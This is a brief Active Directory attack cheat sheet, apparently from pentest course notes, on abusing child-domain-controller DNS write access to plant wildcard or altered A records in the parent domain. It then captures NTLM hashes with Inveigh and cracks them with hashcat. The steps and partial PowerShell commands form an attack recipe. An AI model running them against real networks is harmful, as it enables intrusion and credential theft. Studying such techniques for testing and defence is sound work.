# 14.04 DNS Trust Attack Child‚ÜíParent via SYSTEM

> As SYSTEM on a child DC, abuse `Enterprise Domain Controllers` write access to inject wildcard DNS A records in the parent for Inveigh capture.

## Overview

As SYSTEM on a child DC, the Enterprise Domain Controllers group has write access to DNS records across the forest. This allows injecting a wildcard A record into the parent domain DNS (redirecting all non-existent hostnames to attacker IP) or modifying existing records like DEV01 to redirect traffic for credential capture with Inveigh.

## Steps

- Open SYSTEM shell with PsExec on child DC
- Import Powermad and run **New-ADIDNSNode -Node \*** to add wildcard DNS entry pointing to child DC IP
- Alternatively: **Get-DnsServerResourceRecord** to enumerate parent domain records, then **Set-DnsServerResourceRecord** to modify an existing A record to point to child DC
- Start **Invoke-Inveigh** on child DC to capture NTLM hashes from redirected connections
- Crack captured NTLMv2 hashes with **hashcat -m 5600**

## Commands

### Add wildcard DNS

```powershell
PS C:\Tools> Import-module .\Powermad.ps1
```

### Enumerate DNS records

```powershell
PS C:\Tools> Get-DnsServerResourceRecord -ComputerName DC01.<DOMAIN>.ad -ZoneName <DOMAIN>.ad -Name "@"
```

### Modify DNS record

```powershell
PS C:\Tools> $Old = Get-DnsServerResourceRecord -ComputerName DC01.<DOMAIN>.AD -ZoneName <DOMAIN>.ad -Name DEV01
```

### Start Inveigh

```powershell
PS C:\Tools> Import-Module .\Inveigh.ps1
```

### Crack NTLMv2

```bash
hashcat -m 5600 buster_ntlmv2 /usr/share/wordlists/rockyou.txt
```
